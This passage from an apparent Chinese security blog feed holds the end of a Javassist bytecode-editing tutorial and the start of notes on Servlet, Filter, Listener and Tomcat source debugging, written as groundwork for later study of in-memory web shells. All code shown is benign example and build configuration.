class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//4.设置方法体</span><br>        test.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;Hello World\&quot;);&quot;</span>);<br>        ctClass.writeFile();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071702140.png" alt="image-20240907170209069"></p><h3><span id="方法体前后插入代码">方法体前后插入代码</span></h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">test.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;我在前面插入:\&quot;+$1);&quot;</span>);<br>test.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;我在后面插入了:\&quot;+$2);&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071704977.png" alt="image-20240907170453863"></p><h2><span id="添加构造器">添加构造器</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;classPool.getCtClass(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<span class="hljs-comment">//分别是参数列表，要添加的CtClass</span><br>cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<span class="hljs-comment">//设置name=var1，也就是第一个参数</span><br>ctClass.addConstructor(cons);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071713061.png" alt="image-20240907171307942"></p><blockquote><p>无参构造去掉中间的参数即可</p></blockquote><h2><span id="修改已有类">修改已有类</span></h2><p>用ClassPool获取CtClass之后进行修改，我们对我们我们前面创建的Hello.class进行修改</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//对已有类进行修改</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.insertClassPath(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavassistLearn&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;changing\&quot;);&#125;&quot;</span>);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071745179.png" alt="image-20240907174508054"></p><p>可以看到成功修改</p><blockquote><p>这里添加类路径的时候要注意在包名的上一层，不然会找不到类，因为get的时候用完整包名会自动添加上路径进行搜索</p><p>比如上面的添加路径为：D:\CTF\Java\JavaCode\JavassistLearn，搜索时就是这样：D:\CTF\Java\JavaCode\JavassistLearn\Temp\Hello.class</p></blockquote><h1><span id="一些特殊变量">一些特殊变量</span></h1><p>就是我们前面使用的$1，$0那些</p><table><thead><tr><th>标识符</th><th>作用</th></tr></thead><tbody><tr><td>$0、$1、$2、 $3等</td><td>this和方法参数（1-N是方法参数的顺序）</td></tr><tr><td>$args</td><td>方法参数数组，类型为Object[]</td></tr><tr><td>$$</td><td>所有方法参数，例如：m($$)相当于m($1,$2,…)</td></tr><tr><td>$cflow(…)</td><td>control flow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，在强制转换表达式中使用。</td></tr><tr><td>$w</td><td>包装器类型，在强制转换表达式中使用。</td></tr><tr><td>$_</td><td>方法的返回值</td></tr><tr><td>$sig</td><td>类型为java.lang.Class的参数类型对象数组</td></tr><tr><td>$type</td><td>类型为java.lang.Class的返回值类型</td></tr><tr><td>$class</td><td>类型为java.lang.Class的正在修改的类</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：&lt;a href=&quot;https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>内存马前置学习</title>
    <link href="https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:05:36.000Z</published>
    <updated>2024-09-12T12:18:52.281Z</updated>
    
    <content type="html"><![CDATA[<p>学内存马前就要来学一学java web三大件的相关原理：Servlet、Filter、Listener</p><p>参考文章：<a href="https://www.cnblogs.com/jadite/p/16951328.html">https://www.cnblogs.com/jadite/p/16951328.html</a></p><h1><span id="servlet">Servlet</span></h1><h2><span id="servlet是什么">Servlet是什么</span></h2><p>Servlet是JavaEE规范（接口）之一；<br>Servlet是运行在服务器(Web容器Tomcat等)上的一个 java 小程序，它用来接收客户端发送过来的请求进行处理，并响应数据给客户端。<br>Servlet及相对的对象，都由Tomcat创建，我们只是使用。</p><blockquote><p>Tomcat就是一个servlet容器</p></blockquote><p>Servlet需要完成3个任务：</p><ol><li>接收请求：将客户端发送过来的请求封装成ServletRequest对象（包含请求头、参数等各种信息）</li><li>处理请求：在service方法中接收参数，并且进行处理请求。</li><li>数据响应：请求处理完成后，通过转发（forward）或者重定向（redirect）到某个页面。</li></ol><p><strong>Servlet程序实现</strong></p><ol><li>实现Servlet接口，重新service方法</li><li>在web.xml或者用注解配置映射</li></ol><h2><span id="servlet生命周期">Servlet生命周期</span></h2><ol><li>执行 Servlet 构造器方法<br>第一步，在web.xml中的servlet中配置 load-on-startup 的值 ≥ 0 时，表示应用启动时就创建这个servlet。否则，第一次访问的时候调用。</li><li>执行 init 初始化方法<br>第二步，第一次访问的时候调用。</li><li>执行 service 方法<br>第三步，每次访问都会调用。</li><li>执行 destroy 销毁方法<br>第四步，在 web 工程停止的时候调用。</li></ol><h2><span id="servletconfig">ServletConfig</span></h2><p>它是Servlet程序的配置信息类</p><p><strong>它的三大作用：</strong></p><ol><li>获取web.xml 中 Servlet 程序的别名 servlet-name 的值</li><li>获取web.xml 中 Servlet 程序的获取初始化参数 init-param</li><li>获取 ServletContext 对象</li></ol><p><strong>ServletConfig</strong></p><ol><li>每个web项目只有一个ServletContext对象，在web工程部署启动的时候创建，在工程停止的时候关闭。</li><li>ServletContext 对象是一个域对象（可以像Map一样存储数据的对象。域指的是作用域，这里是整个web工程）。</li></ol><p><strong>ServletContext 类的四个作用：</strong></p><ol><li>获取 web.xml 中配置的上下文参数 context-param</li><li>getContextPath()获取当前的工程路径，格式: &#x2F;工程路径</li><li>getRealPath()获取工程部署后在服务器硬盘上的绝对路径</li><li>像 Map 一样存取数据</li></ol><p><strong>HttpServletRequest和HttpServletResponse</strong></p><p>HttpServletResponse继承了ServletRequest，HttpServletResponse继承了ServletResponse，他们两个都是接口，所以我们在doGet或者doPost的时候传入的肯定是他们的实现类，而这个实现类是由tomcat创建的，封装了请求和响应的信息，到下面讲tomcat的时候再串起来细说。</p><h1><span id="filter">Filter</span></h1><p>Filter 是JavaEE规范（接口）之一；<br>Filter 过滤器它的作用是：拦截请求，过滤响应。</p><p><strong>常见应用场景：</strong><br>1、权限检查<br>2、日记操作<br>3、事务管理<br>……等等</p><p>所以Filter的顺序是在处理请求之前进行</p><p><strong>Filter使用</strong></p><p>1、实现 Filter 接口，实现过滤方法 doFilter()<br>2、到 web.xml或者注解中去配置 Filter 的拦截路径</p><h2><span id="filter生命周期">Filter生命周期</span></h2><ol><li>构造器方法</li><li>init 初始化方法<br>第 1，2 步，在 web 工程启动的时候执行（Filter 已经创建）</li><li>doFilter 过滤方法<br>第 3 步，每次拦截到请求，就会执行</li><li>destroy 销毁<br>第 4 步，停止 web 工程的时候，就会执行（停止 web 工程，也会销毁 Filter 过滤器）</li></ol><h2><span id="filterconfig">FilterConfig</span></h2><p>Tomcat 每次创建 Filter 的时候，也会同时创建一个 FilterConfig 类，这里包含了 Filter 配置文件的配置信息。</p><p><strong>FilterConfig 类的作用是获取 filter 过滤器的配置内容：</strong></p><ol><li>获取 Filter 的名称 filter-name 的内容</li><li>获取在 Filter 中配置的 init-param 初始化参数</li><li>获取 ServletContext 对象</li></ol><h2><span id="filterchain">FilterChain</span></h2><p>就是过滤器链，过滤器可能存在不止一个，它们执行的优先顺序由它们在web.xml中从上到下配置的<strong>filter-mapping</strong>顺序决定，与filter的配置顺序无关</p><p><strong>特点</strong></p><ol><li>所有filter和目标资源默认都执行在一个线程中。</li><li>多个filter共同执行的时候，它们使用的是同一个Request对象。</li></ol><p><strong>拦截路径匹配规则</strong></p><ul><li>精确匹配 &#x2F;target.jsp</li><li>目录匹配 &#x2F;admin&#x2F;*</li><li>后缀名匹配 *.html</li></ul><blockquote><p>Filter只关心路径是否匹配，不关心资源是否存在，毕竟最终不是由它来处理</p></blockquote><h1><span id="listener">Listener</span></h1><p>用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象，当被监视的对象发生情况时，立即采取相应的行动。本质是<strong>观察者模式</strong>。</p><p><strong>Servlet监听器</strong>：Servlet规范中定义的一种特殊类，它用于监听Web应用程序中的ServletContext，HttpSession 和HttpServletRequest等域对象的创建与销毁事件，以及监听这些域对象中的属性发生修改的事件。</p><h2><span id="三类监听器">三类监听器</span></h2><p><img src="https://cdn.clown2024.cn/202409080210968.png" alt="image-20240908021003987"></p><ul><li>域对象监听器</li><li>域对象的属性域监听器</li><li>Session域中数据的监听器</li></ul><h2><span id="八大监听器">八大监听器</span></h2><ol><li><p>ServletContextListener<br>监听ServletContext对象的创建与销毁</p><p>在SpringMVC中，有个<strong>ContextLoaderListener</strong>，这个监听器就实现了ServletContextListener接口，表示对ServletContext对象本身的生命周期进行监控</p></li><li><p>HttpSessionListener</p><p>监听HttpSession对象的创建与销毁</p></li><li><p>ServletRequestListener</p><p>监听ServletRequest对象的创建与销毁</p></li><li><p>ServletContextAttributeListener</p><p>监听ServletContext中属性的创建、修改和销毁</p></li><li><p>HttpSessionAttributeListener</p><p>监听HttpSession中属性的创建、修改和销毁</p></li><li><p>ServletRequestAttributeListener</p><p>监听ServletRequest中属性的创建、修改和销毁</p></li><li><p>HttpSessionBindingListener</p><p>监听某个对象在Session域中的创建与移除</p></li><li><p>HttpSessionActivationListener</p><p>监听某个对象在Session中的序列化与反序列化。</p></li></ol><h2><span id="监听器使用">监听器使用</span></h2><ol><li><p>实现八大监听器中的一种，重写对应方法</p></li><li><p>同样去web.xml或者用注解配置</p><p>web.xml配置</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>com.demo.listener.HelloListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h1><span id="tomcat">Tomcat</span></h1><p>推荐一个视频讲得非常好(我个人觉得)，把很多东西串起来了而且深入到源码层面，理解得更加清晰</p><p>视频链接：<a href="https://www.bilibili.com/video/BV19E411j7cD/?spm_id_from=333.999.0.0&vd_source=f056182291458f597ae69cee19ecf116">【图灵学院】终于有人把tomcat讲清楚了！Tomcat底层原理深度解析_哔哩哔哩_bilibili</a></p><p><strong>Tomcat简单架构图</strong></p><p><img src="https://cdn.clown2024.cn/202409122011964.png" alt="image-20240912201120883"></p><h2><span id="tomcat源码启动">Tomcat源码启动</span></h2><p>这里就搞了我好久了，看了很多文章才搞定，最后参考的是下面两篇文章</p><p><a href="https://blog.csdn.net/zhoutaoping1992/article/details/104751705">记一次tomcat源码启动控制台中文乱码问题调试过程_org.apache.catalina.startup.versionloggerlistener.-CSDN博客</a></p><p><a href="https://www.cnblogs.com/huim/p/16614196.html">idea调试tomcat源码 - huim - 博客园 (cnblogs.com)</a></p><p><strong>源码下载</strong></p><p>首先找到源码包下载，这里用的tomcat-8.5.50的版本</p><p>历史版本列表：<a href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a><br>源码文件夹：<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/</a></p><p>然后在源码根目录下添加如下pom.xml文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sourceDirectory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">sourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testSourceDirectory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">testSourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testResources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">testResource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">testResource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">testResources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.easymock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easymock<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.xml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jaxrpc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.eclipse.jdt.core.compiler<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ecj<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092054244.png" alt="image-20240909205433170"></p><p>然后配置一下合适的jdk版本，这个就不多说了</p><p>下一步配置configuration，添加一个application</p><p><img src="https://cdn.clown2024.cn/202409092056897.png" alt="image-20240909205609843"></p><p>添加入口类org.apache.catalina.startup.Bootstrap</p><blockquote><p>在此之前需要reload一下maven项目，不然会不识别相关的java源码</p></blockquote><p><img src="https://cdn.clown2024.cn/202409092057339.png" alt="image-20240909205701250"></p><p>然后我们就可以启动了</p><p><strong>错误一</strong></p><p>这时候会遇到第一个错误，无法解析jsp，也就是访问localhost:8080不是tomcat的首页而是返回了500，这时候需要去添加一个JSP解析器，需要我们去修改源码</p><p>找到org.apache.catalina.startup.ContextConfig类，在ConfigureStart方法下添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">context.addServletContainerInitializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperInitializer</span>(), <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092101636.png" alt="image-20240909210146552"></p><p><strong>错误二</strong></p><p>这时候页面访问是正常的，但是控制台的日志是乱码的，如下</p><p><img src="https://cdn.clown2024.cn/202409092047988.png" alt="image-20240909204702883"></p><p>这是因为在java中, 读取文件的默认格式是iso8859-1, 而我们中文存储的时候一般是UTF-8. 所以导致读出来的是乱码。</p><p>文章中有两种方式修改乱码，我这里采用修改源码的方式去修改，就是找到读取文件的地方，转化一下编码方式，这里直接copy一下解决方案，可以自己通过调试去找到对应位置(我比较懒就不调了)</p><ul><li><p>org.apache.tomcat.util.res.StringManager类中的getString(final String key, final Object… args)方法；添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        value =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(value.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092105213.png" alt="image-20240909210550131"></p></li><li><p>org.apache.jasper.compiler.Localizer类的getMessage(String errCode)方法；添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        errMsg =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(errMsg.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>        e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092107159.png" alt="image-20240909210715069"></p></li></ul><p>到这里就解决完我遇到的所有问题，可以快乐调试了🫡</p><h2><span id="原理分析">原理分析</span></h2><p>我们首先要知道Tomcat是一个servlet容器。</p><h3><span id="httpservletrequest和httpservletresponse">HttpServletRequest和HttpServletResponse</span></h3><p><img src="https://cdn.clown2024.cn/202409112032626.png" alt="image-20240911203158516"></p><p><img src="https://cdn.clown2024.cn/202409112033582.png" alt="image-20240911203322536"></p><p>我们知道HttpServletRequest和HttpServletResponse是一个接口，我们正常写一个servlet如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servlettest;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <br>        <span class="hljs-comment">// Hello</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;destory &quot;</span>+message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们调用这两个接口的方法就需要一个实现类，那这个实现类是谁创建呢，就由我们的tomcat来创建</p><p>去看tomcat的源码就可以知道RequestFacade就是其中一个实现类</p><p><img src="https://cdn.clown2024.cn/202409112036033.png" alt="image-20240911203618945"></p><p>不过这个类只是一个类似门面的类，里面真正的实现是Request类，里面的方法更复杂，该类也是实现了Servlet规范的类</p><p><img src="https://cdn.clown2024.cn/202409121050908.png" alt="image-20240912105042783"></p><p>这里就是给下面的分析当个引子，引发一下思考。</p><h3><span id="jar包和war包">jar包和war包</span></h3><p>我们在tomcat部署项目的时候，可以将web项目打包成war包然后部署到tomcat的webapps目录下</p><p><img src="https://cdn.clown2024.cn/202409121053527.png" alt="image-20240912105338467"></p><p>启动tomcat的时候他就会自动解压，里面的内容如下：</p><p><img 